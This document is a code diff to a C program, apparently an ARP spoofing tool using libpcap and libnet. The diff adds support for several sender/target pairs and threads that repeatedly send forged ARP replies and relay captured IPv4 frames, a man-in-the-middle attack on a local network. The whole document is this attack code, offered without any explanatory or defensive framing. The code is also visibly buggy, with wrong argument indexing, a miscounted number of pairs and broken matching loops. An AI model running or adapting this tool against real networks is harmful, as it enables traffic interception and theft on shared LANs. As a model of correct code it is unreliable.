@@ -9,6 +9,7 @@
 #include <netinet/ether.h>
 #include <cstring>
 #include <libnet.h>
+#include <pthread.h>
 
 typedef struct arp {
     libnet_ethernet_hdr eth;
@@ -23,6 +24,13 @@ typedef struct arp {
     uint8_t target_ip[4];
     uint8_t pad[12];
 } arp;
+
+typedef struct copy_ip{
+	char sender_ip[16];
+    char target_ip[16];
+} copy_ip;
+
+pcap_t* fp;
 
 void usage() {
 
@@ -59,25 +67,61 @@ void mac_eth0(uint8_t* dst, char *dev)
 
 }
 
+void *send_arp_packet(void *spoofing){
+
+	while(true)
+    {
+        struct pcap_pkthdr* header;
+        const uint8_t* data;
+		arp *packet;
+        int res = pcap_next_ex(fp, &header, &data);
+		arp *spoof = (arp *)spoofing;
+		if (res == 0) continue;
+        if (res == -1 || res == -2) break;
+		packet = (arp*)data;
+		
+        if (my_ntohs(packet->eth.ether_type) == 0x0800) {
+
+			memcpy(packet->eth.ether_dhost, spoof->sender_mac, 6);
+			memcpy(packet->eth.ether_shost, spoof->target_mac, 6);
+
+			if(pcap_sendpacket(fp, (u_char*)packet, header->caplen) == -1){
+				break;
+			}
+
+		}else if(my_ntohs(packet->eth.ether_type) == 0x0806){
+
+			pcap_sendpacket(fp, (u_char*)spoofing, sizeof(arp));
+
+		}
+
+	}
+
+}
+
 int main(int argc, char* argv[], char* envp[]) {
-    pcap_t* fp;
-    char errbuf[PCAP_ERRBUF_SIZE];
+
+	char errbuf[PCAP_ERRBUF_SIZE];
     char* dev = argv[1];
     char sender_ip[16];
     char target_ip[16];
     uint8_t my_mac[6];
     uint8_t is_target;
-    int i;
+    int i, j;
+	int snum = 0;
     struct pcap_pkthdr* header;
     const uint8_t* data;
     arp* packet;
     arp* send;
     arp* spoofing;
+	pthread_t *tid;
+	copy_ip *arp_ip;
+	void *arg;
 
     setvbuf(stdin, 0LL, 1, 0LL);
     setvbuf(stdout, 0LL, 1, 0LL);
 
-    if (argc != 4) {
+    if (argc < 4) {
         usage();
         return -1;
     }
@@ -88,31 +132,40 @@ int main(int argc, char* argv[], char* envp[]) {
         fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
         return -1;
     }
+	
+	snum = (argc-1)/2;
 
-    strncpy(sender_ip, argv[2], 15);
-    strncpy(target_ip, argv[3], 15);
+	arp_ip = (copy_ip *)malloc(sizeof(copy_ip)*snum);
 
-    send = (arp*)malloc(sizeof(arp));
+	for ( i=0; i<snum; i++){
+		memcpy(arp_ip[i].sender_ip, argv[i*2], 15);
+		memcpy(arp_ip[i].target_ip, argv[i*2+1], 15);
+	}
+
+    send = (arp*)malloc(sizeof(arp)*snum);
 
     mac_eth0(my_mac, dev);
 
+	for ( i=0; i<snum; i++){
 
-    memset(send->eth.ether_dhost, 0xff, 6);
-    memcpy(send->eth.ether_shost, my_mac, 6);
-    memcpy(send->target_mac, my_mac, 6);
-    memset(send->sender_mac, 0, 6);
+    	memset(send[i].eth.ether_dhost, 0xff, 6);
+    	memcpy(send[i].eth.ether_shost, my_mac, 6);
+    	memcpy(send[i].target_mac, my_mac, 6);
+    	memset(send[i].sender_mac, 0, 6);
 
-    send->eth.ether_type = my_ntohs(0x0806);
-    send->h_type = my_ntohs(1);
-    send->p_type = my_ntohs(0x0800);
-    send->h_size = 6;
-    send->p_size = 4;
+    	send[i].eth.ether_type = my_ntohs(0x0806);
+    	send[i].h_type = my_ntohs(1);
+    	send[i].p_type = my_ntohs(0x0800);
+    	send[i].h_size = 6;
+    	send[i].p_size = 4;
 
-    send->opcode = my_ntohs(1);
-    insert_ip(send->sender_ip, sender_ip);
-    insert_ip(send->target_ip, target_ip);
+    	send[i].opcode = my_ntohs(1);
+    	insert_ip(send[i].sender_ip, arp_ip[i].sender_ip);
+    	insert_ip(send[i].target_ip, arp_ip[i].target_ip);
+	}
 
     while (true) {
+
         pcap_sendpacket(fp, (u_char*)send, sizeof(arp));
         int res = pcap_next_ex(fp, &header, &data);
 
@@ -120,46 +173,71 @@ int main(int argc, char* argv[], char* envp[]) {
         if (!data) continue;
 
         packet = (arp*)data;
-        if (my_ntohs(packet->eth.ether_type) == 0x0806) {
-            if (my_ntohs(packet->opcode) == 2) {
-                is_target = true;
-                for (i = 0; i < 4; ++i) {
-                    if (packet->sender_ip[i] != send->target_ip[i]) {
-                        is_target = false;
-                        break;
-                    }
 
-                    if (packet->target_ip[i] != send->sender_ip[i]) {
-                        is_target = false;
-                        break;
-                    }
+        if (my_ntohs(packet->eth.ether_type) == 0x0806) {
+
+            if (my_ntohs(packet->opcode) == 2) {
+
+                is_target = true;
+
+                for (i = 0; i < 4; ++i) {
+
+					for( j=0; j<snum; j++){
+
+                    	if (packet->sender_ip[i] != send[j].target_ip[i]) {
+                        	is_target = false;
+                        	break;
+                    	}
+
+                    	if (packet->target_ip[i] != send[j].sender_ip[i]) {
+                        	is_target = false;
+                        	break;
+                    	}
+					}
                 }
                 if (is_target) break;
             }
         }
     }
 
-    spoofing = (arp*)malloc(sizeof(arp));
+    spoofing = (arp*)malloc(sizeof(arp)*snum);
 
-    spoofing->eth.ether_type = my_ntohs(0x0806);
-    spoofing->h_type = my_ntohs(1);
-    spoofing->p_type = my_ntohs(0x0800);
-    spoofing->h_size = 6;
-    spoofing->p_size = 4;
-    spoofing->opcode = my_ntohs(2);
+	for ( i=0; i<snum; i++){
 
-    memcpy(spoofing->eth.ether_dhost, packet->sender_mac, 6);
-    memcpy(spoofing->eth.ether_shost, my_mac, 6);
-    memcpy(spoofing->target_mac, my_mac, 6);
-    memcpy(spoofing->sender_mac, packet->sender_mac, 6);
+    	spoofing[i].eth.ether_type = my_ntohs(0x0806);
+    	spoofing[i].h_type = my_ntohs(1);
+    	spoofing[i].p_type = my_ntohs(0x0800);
+    	spoofing[i].h_size = 6;
+    	spoofing[i].p_size = 4;
+    	spoofing[i].opcode = my_ntohs(2);
 
-    insert_ip(spoofing->sender_ip, sender_ip);
-    insert_ip(spoofing->target_ip, target_ip);
+    	memcpy(spoofing[i].eth.ether_dhost, packet->sender_mac, 6);
+    	memcpy(spoofing[i].eth.ether_shost, my_mac, 6);
+    	memcpy(spoofing[i].target_mac, my_mac, 6);
+    	memcpy(spoofing[i].sender_mac, packet->sender_mac, 6);
 
+    	insert_ip(spoofing[i].sender_ip, arp_ip[i].sender_ip);
+    	insert_ip(spoofing[i].target_ip, arp_ip[i].target_ip);
+
+	}
+
+	tid = (pthread_t *)malloc(sizeof(pthread_t)*snum);
+
+	
     while (true) {
 
         printf("send arp packet\n");
-        pcap_sendpacket(fp, (u_char*)spoofing, sizeof(arp));
 
+		for ( i=0; i<snum; i++){
+			//arg = spoofing[i];
+			pthread_create(&tid[i],NULL,send_arp_packet, (void *)(&spoofing[i]));
+
+		}
+
+		for ( i=0; i<snum; i++){
+
+			pthread_join(tid[i],NULL);
+
+        }
     }
 }
